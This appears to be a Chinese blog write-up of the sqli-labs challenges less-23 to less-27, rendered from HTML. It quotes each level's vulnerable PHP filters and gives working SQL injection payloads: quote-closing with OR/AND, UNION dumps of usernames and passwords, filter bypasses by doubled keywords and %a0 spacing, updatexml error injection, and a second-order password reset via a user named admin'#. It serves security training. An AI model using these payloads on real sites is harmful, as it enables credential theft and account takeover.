<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">id=1	不报错</span><br><span class="line">id=1'	报错</span><br><span class="line">id=1<span class="string">"	不报错</span></span><br></pre></td></tr></table></figure>

<p>所以是单引号闭合的查询,但是不管怎样都不能闭合，查看源码</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$re</span>g = <span class="string">"/#/"</span>;</span><br><span class="line"><span class="symbol">$re</span>g1 = <span class="string">"/--/"</span>;</span><br><span class="line"><span class="symbol">$repla</span>ce = <span class="string">""</span>;</span><br><span class="line"><span class="symbol">$i</span>d = preg_replace(<span class="symbol">$re</span>g, <span class="symbol">$repla</span>ce, <span class="symbol">$i</span>d);</span><br><span class="line"><span class="symbol">$i</span>d = preg_replace(<span class="symbol">$re</span>g1, <span class="symbol">$repla</span>ce, <span class="symbol">$i</span>d);</span><br></pre></td></tr></table></figure>

<p>原来是将#  – 等字符过滤了，但是将其url编码号任然不行<br>查案执行的SQL语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>这种怎么办？思路有两个：1、用别的注释符 2、用其他方法替代注释符 注释符还有一个/<em><em>/但它用来注释星号之间的东西：/\</em>被注释的部分\</em>/ 采用第二个思路，用其他语句替代注释符，如何去闭合 SQL 语句呢–逻辑运算符<br>我们可以使用 or 或 and 尝试构造额外的逻辑运算。<br>构造如下语句<br><code>Id=1&#39; and 1=1 or&#39;</code> 将它放到 SQL 语句中就是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span>*FROMusersWHERE <span class="keyword">id</span>=<span class="string">'1'</span><span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">or</span><span class="string">''</span>LIMIT0,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>这样就闭合了引号不存在语法错误，且其逻辑结果在我们的控制范围内。<br>那么用 and 呢？ </p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span>' and <span class="number">1</span>=<span class="number">1</span> and '<span class="number">1</span> 因为要保证 and <span class="number">1</span>=<span class="number">1</span> 使我们可控的部分，所以要保证后面的逻辑为正，不为 <span class="number">0</span></span><br><span class="line">id=<span class="number">1</span>' and <span class="number">1</span>=<span class="number">1</span> or' 返回正常 </span><br><span class="line">id=<span class="number">1</span>' and <span class="number">1</span> = <span class="number">2</span> or' 返回错误</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/17/sqli_labs21-37/4.png" alt></p>
<p>然后查询字段但是order by并不能正常查询，原因：</p>
<p><code>where</code>与<code>order by</code>是子句，<code>and</code>是操作符，用于<code>where</code>子句。<br> 在MySQL的执行顺序中，<code>where</code>是远在<code>order by</code>前面的。</p>
<p>在第一个查询语句中，<code>id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39;</code>作为<code>where</code>的条件，先被执行，得到结果集；然后是<code>order by</code>，因结果集中无第四个字段所以报错。</p>
<p>在第二个查询语句中，<code>order by</code>在<code>where</code>的条件中，在<code>where</code>执行时被忽略了，结果集生成后并未再执行order by</p>
<p>所以这关不能用<code>order by</code>来判断字段数，而要用<code>union</code>：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">id=<span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> or '</span><br></pre></td></tr></table></figure>

<p>这里id=-1，使原查询左边为空，使我们定义的查询结果返回<br><img src="/2020/03/17/sqli_labs21-37/5.png" alt><br>接下来便是正常查询了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">数据库名</span><br><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span> <span class="keyword">or</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">表名</span></span><br><span class="line"><span class="string">id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="number">4</span> <span class="keyword">or</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">列名</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name=<span class="string">'users'</span>),<span class="number">4</span> <span class="keyword">or</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">内容</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">4</span> <span class="keyword">or</span> <span class="string">'</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/17/sqli_labs21-37/6.png" alt></p>
<h1 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h1><p>基于存储_POST_单引号_二次注入<br>进去后发现有登陆框，忘记密码，注册用户，修改密码等界面，一时无法判断注入点在哪里，先查看一下源码<br>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'Auth'</span>]))</span><br><span class="line">    header(<span class="string">'Location: logged-in.php'</span>);</span><br></pre></td></tr></table></figure>

<p>login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">$password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br></pre></td></tr></table></figure>

<p>可以看到对<code>username</code>和<code>password</code>都做了过滤，很难注入。</p>
<p>login_create.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$username =  mysql_escape_string($_POST[<span class="string">'username'</span>]);</span><br><span class="line">$pass = mysql_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$re_pass = mysql_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">SELECT count(*) <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">username</span>=<span class="string">'$username'</span></span><br><span class="line">INSERT INTO<span class="built_in"> users </span>(username,password) values (\<span class="string">"<span class="variable">$username</span>\", \"<span class="variable">$pass</span>\")</span></span><br><span class="line"><span class="string">创建用户前先查询是否已经存在该账号</span></span><br></pre></td></tr></table></figure>

<p>pass_change.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$username = $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">$curr_pass = mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);</span><br><span class="line">$pass = mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$re_pass = mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">UPDATE<span class="built_in"> users </span><span class="builtin-name">SET</span> <span class="attribute">PASSWORD</span>=<span class="string">'$pass'</span> WHERE <span class="attribute">username</span>=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">'$curr_pass'</span></span><br></pre></td></tr></table></figure>

<p>这里发现从<code>session</code>中获得了当前用户名，且被直接用于更新语句并未做检查。<br> 从根本上来说，插入数据时没有过滤，只是做了转义处理。<br> 若当前用户名中含有注释，便可以修改当前用户名中包含的另一用户的密码。</p>
<h2 id="二次注入："><a href="#二次注入：" class="headerlink" title="二次注入："></a>二次注入：</h2><p>二次注入也称为存储型注入，就是将可能导致 SQL 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发 SQL 注入。</p>
<p>二次注入的一般过程：</p>
<p>1.通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务<br> 端进行处理，提交的数据报文请求中可能包含了构造的 SQL 语句或者命令。<br>2.服务端应用程序会将提交的数据信息进行存储，通常是保存在数据库中，保存的<br> 数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。<br>3.向服务端发送第二个与第一次不相同的请求数据信息。<br>4.服务端接收到提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。<br>5.服务端返回执行的处理结果数据信息，便可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</p>
<p>注入过程</p>
<p><strong>步骤1：</strong>确定注入逻辑</p>
<p>注入点在修改密码处：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">UPDATE<span class="built_in"> users </span><span class="builtin-name">SET</span> <span class="attribute">PASSWORD</span>=<span class="string">'$pass'</span> WHERE <span class="attribute">username</span>=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">'$curr_pass'</span></span><br></pre></td></tr></table></figure>

<p>要将其变为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">'$pass'</span> <span class="keyword">WHERE</span> username=<span class="string">'$username'</span><span class="comment">-- and password='$curr_pass'</span></span><br></pre></td></tr></table></figure>

<p>且已知注册时未有任何过滤，闭合查询语句为单引号，即在注册用户时构造<code>admin&#39;-- (有空格)</code>或<code>admin&#39;#</code></p>
<p>先注册一个admin’#用户<br><img src="/2020/03/17/sqli_labs21-37/7.png" alt><br>注册后的数据库<br><img src="/2020/03/17/sqli_labs21-37/8.png" alt><br>然后登陆并修改密码<br><img src="/2020/03/17/sqli_labs21-37/9.png" alt><br>然后便可以使用admin登陆了，密码为修改后的密码<br><img src="/2020/03/17/sqli_labs21-37/10.png" alt><br><img src="/2020/03/17/sqli_labs21-37/11.png" alt><br>修改密码后的数据库<br><img src="/2020/03/17/sqli_labs21-37/12.png" alt></p>
<h1 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h1><p>基于错误_GET_过滤OR/AND_单引号_字符型注入<br>输入：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">id=1	正常</span><br><span class="line">id=1'	错误</span><br><span class="line">id=1'--+	正常回显</span><br></pre></td></tr></table></figure>

<p>并且过滤了or 和and<br><img src="/2020/03/17/sqli_labs21-37/13.png" alt><br>这样我们便不能使用<code>order by</code>查询字段，但是我们可以直接使用union</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>=1'union select 1,2,3,4--+	错误回显</span><br><span class="line"><span class="attribute">id</span>=1'union select 1,2,3--+		正常回显</span><br><span class="line"></span><br><span class="line">查询数据库名字</span><br><span class="line"><span class="attribute">id</span>=-1'union select 1,database(),3--+</span><br><span class="line"></span><br><span class="line">查询表名</span><br><span class="line"><span class="attribute">id</span>=-1'union select 1,group_concat(table_name),3 <span class="keyword">from</span> infoorrmation_schema.tables where <span class="attribute">table_schema</span>=<span class="string">'security'</span>--+   #这里由于过滤了<span class="keyword">or</span>，所以information里面的<span class="keyword">or</span>也被过滤了，所以可以尝试双写绕过</span><br><span class="line"></span><br><span class="line">查询列名</span><br><span class="line"><span class="attribute">id</span>=-1'union select 1,group_concat(column_name),3 <span class="keyword">from</span> infoorrmation_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span>--+ </span><br><span class="line"></span><br><span class="line">查询字段</span><br><span class="line"><span class="attribute">id</span>=-1'union select 1,group_concat(username,passwoorrd),3 <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/17/sqli_labs21-37/14.png" alt></p>
<h2 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h2><p>有过滤的时候首先要判断这个过滤是<strong>一次性</strong>的还是<strong>非一次性</strong>的：</p>
<p>若是<strong>一次性</strong>的，且只是将过滤字符换成了空字符：</p>
<blockquote>
<ul>
<li>双写——<code>or</code>=<code>oorr</code>、<code>and</code>=<code>anandd</code> </li>
</ul>
</blockquote>
<p>若是<strong>非一次性</strong>的，就要考虑一些变形：</p>
<blockquote>
<ul>
<li>大小写变形——<code>or</code>=<code>Or</code>=<code>oR</code>=<code>OR</code> </li>
<li>利用运算符——<code>or</code>=<code>||</code>、<code>and</code>=<code>&amp;&amp;</code> </li>
<li>URL编码——<code>#</code>=<code>%23</code>，Hex编码——<code>~</code>=<code>0x7e</code> </li>
<li>添加注释——<code>/*or*/</code></li>
</ul>
</blockquote>
<h1 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h1><p>这一关单引号双引号都没有回显，所以尝试一下数字型注入，正常回显<br><img src="/2020/03/17/sqli_labs21-37/15.png" alt><br>然后就与less-25一样了</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">查询数据库名字</span><br><span class="line">id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span></span><br><span class="line"></span><br><span class="line">查询表名</span><br><span class="line">id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>),<span class="number">3</span> <span class="keyword">from</span> infoorrmation_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span>   #这里由于过滤了<span class="keyword">or</span>，所以information里面的<span class="keyword">or</span>也被过滤了，所以可以尝试双写绕过</span><br><span class="line"></span><br><span class="line">查询列名</span><br><span class="line">id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>),<span class="number">3</span> <span class="keyword">from</span> infoorrmation_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span></span><br><span class="line"></span><br><span class="line">查询字段</span><br><span class="line">id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username,passwoorrd),<span class="number">3</span> <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/17/sqli_labs21-37/16.png" alt></p>
<h1 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h1><p>基于错误_GET_过滤空格/注释_单引号_字符型注入<br>先判断注入类型</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">id=1	正常</span><br><span class="line">id=1'	错误回显</span><br><span class="line">id=1<span class="string">"	正常</span></span><br></pre></td></tr></table></figure>

<p>但是过滤了空格，注释符，or 和and<br>查看一下源码</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = blacklist(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$hint</span> =<span class="variable">$id</span>;</span><br><span class="line">function blacklist(<span class="variable">$id</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>,<span class="variable">$id</span>);             <span class="regexp">//strip</span> out OR (non <span class="keyword">case</span> sensitive)</span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>,<span class="variable">$id</span>);            <span class="regexp">//</span>Strip out AND (non <span class="keyword">case</span> sensitive)</span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>,<span class="variable">$id</span>);          <span class="regexp">//strip</span> out /*</span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>,<span class="variable">$id</span>);            <span class="regexp">//</span>Strip out --</span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>,<span class="variable">$id</span>);             <span class="regexp">//</span>Strip out <span class="comment">#</span></span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>,<span class="variable">$id</span>);            <span class="regexp">//</span>Strip out spaces</span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>,<span class="variable">$id</span>);        <span class="regexp">//</span>Strip out slashes</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不仅过滤了上一关的<code>or</code>与<code>and</code>，还过滤了单行注释<code>--</code>与<code>#(含URL编码)</code>以及多行注释<code>/**/</code>（被解释为空格，常用于过滤空格时），还过滤了<code>(空格)</code>，以及正反斜杠<code>/</code>与<code>\</code>。</p>
<p>有三种注入方式，两个明注和一个盲注。</p>
<ul>
<li>明注一：因正确回显非固定字符串，可利用特殊 URL 编码代替空格，仍使用<code>union</code>加空格连接<code>select</code>联合注入。</li>
<li>明注二：因错误回显是 MySQL 错误信息，可利用报错注入即 Less 17 中提到的几种方法，首选是<code>updatexml()注入</code>与<code>extractvalue()注入</code>，因其他方法仍不能避开空格的使用。</li>
<li>盲注：基于 Bool 盲注，构造注入语句避开空格。</li>
</ul>
<h2 id="正确注入："><a href="#正确注入：" class="headerlink" title="正确注入："></a>正确注入：</h2><p>这里是空格的 URL 编码替代方法。</p>
<ul>
<li><code>%09</code> TAB 键（水平）</li>
<li><code>%0a</code> 新建一行</li>
<li><code>%0b</code> TAB 键（垂直）</li>
<li><code>%0c</code> 新的一页</li>
<li><code>%0d</code> return 功能</li>
<li><code>%a0</code> 空格</li>
</ul>
<p>我们使用%a0代替空格，使用less-23的方法试构造额外的逻辑运算来绕过<br>payoad</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">查看字段</span><br><span class="line">id=<span class="number">-1</span>'union<span class="symbol">%a0select</span><span class="symbol">%a01</span>,<span class="number">2</span>,<span class="number">3</span><span class="symbol">%a0oorr</span>'</span><br><span class="line"></span><br><span class="line">查看库名</span><br><span class="line">id=<span class="number">0</span>'union<span class="symbol">%a0select</span><span class="symbol">%a01</span>,database(),<span class="number">3</span><span class="symbol">%a0oorr</span>' #由于过滤了-，所以这里可以使用id=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">差看表名</span><br><span class="line">id=<span class="number">0</span>'union<span class="symbol">%a0select</span><span class="symbol">%a01</span>,group_concat(table_name),<span class="number">3</span><span class="symbol">%a0from</span><span class="symbol">%a0infoorrmation_schema.tables</span><span class="symbol">%a0where</span><span class="symbol">%a0table_schema</span>='security'<span class="symbol">%a0oorr</span>'</span><br><span class="line"></span><br><span class="line">查看列名</span><br><span class="line">id=<span class="number">0</span>'union<span class="symbol">%a0select</span><span class="symbol">%a01</span>,group_concat(column_name),<span class="number">3</span><span class="symbol">%a0from</span><span class="symbol">%a0infoorrmation_schema.columns</span><span class="symbol">%a0where</span><span class="symbol">%a0table_name</span>='users'<span class="symbol">%a0oorr</span>'</span><br><span class="line"></span><br><span class="line">查看内容</span><br><span class="line">id=<span class="number">0</span>'union<span class="symbol">%a0select</span><span class="symbol">%a01</span>,(<span class="keyword">select</span><span class="symbol">%a0group_concat</span>(concat_ws('-',id,username,passwoorrd))<span class="symbol">%a0from</span><span class="symbol">%a0users</span>),<span class="number">3</span><span class="symbol">%a0oorr</span>'</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/17/sqli_labs21-37/17.png" alt></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>这里用到的是<code>updatexml()</code>函数，选用这个函数是因为没有需要空格的地方，可以用小括号和运算符代替</p>
<p>报错注入用法</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="string">'#'</span>,(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> ...) a)),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查看库名</span><br><span class="line">id=0'||updatexml(1,concat('$',(database())),0)||'</span><br><span class="line"></span><br><span class="line">差看表名</span><br><span class="line">id=0'||updatexml(1,concat('$',(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(infoorrmation_schema.tables)<span class="keyword">where</span>(table_schema=<span class="string">'security'</span>))),<span class="number">0</span>)||<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查看列名</span></span><br><span class="line"><span class="string">?id=0'</span>||updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="string">'$'</span>,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(infoorrmation_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'users'</span>))),<span class="number">0</span>)||<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查看内容</span></span><br><span class="line"><span class="string">?id=0'</span>||updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="string">'$'</span>,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(<span class="keyword">id</span>,username,passwoorrd))<span class="keyword">from</span>(<span class="keyword">users</span>))),<span class="number">0</span>)||<span class="string">'</span></span><br></pre></td></tr></table></figure>

<h1 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h1><p>基于错误_GET_过滤空格/注释_单引号_小括号_字符型_盲注</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">id=1		正常回显</span><br><span class="line">id=1'		无回显</span><br><span class="line">id=1<span class="string">"		正常回显</span></span><br></pre></td></tr></table></figure>

<p>可以判断为单引号字符型注入<br>然后判断是否有小括号判断小括号有几种方法：</p>
<ol>
<li><code>2&#39;&amp;&amp;&#39;1&#39;=&#39;1</code></li>
</ol>
<ul>
<li>若查询语句为<code>where id=&#39;$id&#39;</code>，查询时是<code>where id=&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;</code>，结果是<code>where id=&#39;2&#39;</code>，回显会是<code>id=2</code>。</li>
<li>若查询语句为<code>where id=(&#39;$id&#39;)</code>，查询时是<code>where id=(&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;)</code>，MySQL 将<code>&#39;2&#39;</code>作为了 Bool 值，结果是<code>where id=(&#39;1&#39;)</code>，回显会是<code>id=1</code>。</li>
</ul>
<ol start="2">
<li><code>1&#39;)||&#39;1&#39;=(&#39;1</code><br> 若查询语句有小括号正确回显，若无小括号错误回显（无回显）</li>
</ol>
<p><img src="/2020/03/17/sqli_labs21-37/18.png" alt><br>说明存在小括号<br>然后与less-26一样</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">先查字段</span><br><span class="line">id=-<span class="number">1</span><span class="meta">%27</span>)<span class="meta">%a0union</span><span class="meta">%a0select</span><span class="meta">%a01</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">%a0oorr</span>(<span class="meta">%27</span></span><br></pre></td></tr></table></figure>

<p>查数据库名</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="symbol">%27</span>)<span class="symbol">%a0union</span><span class="symbol">%a0select</span><span class="symbol">%a01</span>,database(),<span class="number">3</span><span class="symbol">%a0anandd</span><span class="symbol">%a0</span>(<span class="symbol">%27</span></span><br></pre></td></tr></table></figure>

<p>查表名</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="symbol">%27</span>)<span class="symbol">%a0union</span><span class="symbol">%a0select</span><span class="symbol">%a01</span>,group_concat(table_name),<span class="number">3</span><span class="symbol">%a0from</span><span class="symbol">%a0infoorrmation_schema.tables</span><span class="symbol">%a0where</span><span class="symbol">%a0table_schema</span>=database()<span class="symbol">%a0</span><span class="symbol">%26</span><span class="symbol">%26</span><span class="symbol">%a0</span>(<span class="symbol">%271</span><span class="symbol">%27</span>)=(<span class="symbol">%271</span></span><br></pre></td></tr></table></figure>

<p>列名</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span>')<span class="symbol">%a0union</span><span class="symbol">%a0select</span><span class="symbol">%a01</span>,group_concat(column_name),<span class="number">3</span><span class="symbol">%a0from</span><span class="symbol">%a0infoorrmation_schema.columns</span><span class="symbol">%a0where</span><span class="symbol">%a0table_name</span>='users'<span class="symbol">%a0</span><span class="symbol">%26</span><span class="symbol">%26</span><span class="symbol">%a0</span>('<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>内容</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="symbol">%27</span>)<span class="symbol">%a0union</span><span class="symbol">%a0select</span><span class="symbol">%a01</span>,group_concat(username,<span class="number">0x3a</span>,passwoorrd),<span class="number">3</span><span class="symbol">%a0from</span><span class="symbol">%a0users</span><span class="symbol">%a0where</span><span class="symbol">%a0</span>(<span class="symbol">%271</span><span class="symbol">%27</span>)=(<span class="symbol">%271</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/17/sqli_labs21-37/19.png" alt></p>
<h1 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h1><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line"><span class="attribute">id</span>=1		正常回显</span><br><span class="line"><span class="attribute">id</span>=1'		无回显</span><br><span class="line"><span class="attribute">id</span>=1"		正常回显</span><br><span class="line"><span class="attribute">id</span>=1'or'	正常回显</span><br></pre></td></tr></table></figure>

<p>所以可以判断为单引号字符型，无小括号<br>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id = blacklist($id);</span><br><span class="line">$hint = $id;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>,$id);       <span class="comment">//strip out /*</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>,$id);         <span class="comment">//Strip out --.</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>,$id);          <span class="comment">//Strip out #.</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>,$id);         <span class="comment">//Strip out spaces.</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>,$id);      <span class="comment">//Strip out spaces.</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>,$id);         <span class="comment">//Strip out spaces.</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>,$id);       <span class="comment">//Strip out union</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>,$id);      <span class="comment">//Strip out select</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>,$id);       <span class="comment">//Strip out UNION</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>,$id);      <span class="comment">//Strip out SELECT</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>,$id);       <span class="comment">//Strip out Union</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>,$id);      <span class="comment">//Strip out select</span></span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现没有过滤<code>or</code>与<code>and</code>，过滤了几个大小写的<code>union</code>和<code>select</code>但是可以用随机大小写绕过，过滤了<code>--</code>、<code>#</code>以及<code>/**/</code>，过滤了两次<code>空格</code>，过滤了<code>/</code>但没过滤<code>\</code>。<br> 所以实际上只过滤了<code>注释</code>与<code>空格</code>，与 Less 26 相似。</p>
<p>直接明注</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">爆内容</span><br><span class="line">id=<span class="number">0</span><span class="meta">%27uunionnion</span><span class="meta">%a0sElect</span><span class="meta">%a01</span>,(sElect<span class="meta">%a0password</span><span class="meta">%a0from</span><span class="meta">%a0users</span><span class="meta">%a0limit</span><span class="meta">%a03</span>,<span class="number">1</span>),<span class="number">3</span><span class="meta">%a0or</span><span class="meta">%27</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/17/sqli_labs21-37/20.png" alt></p>
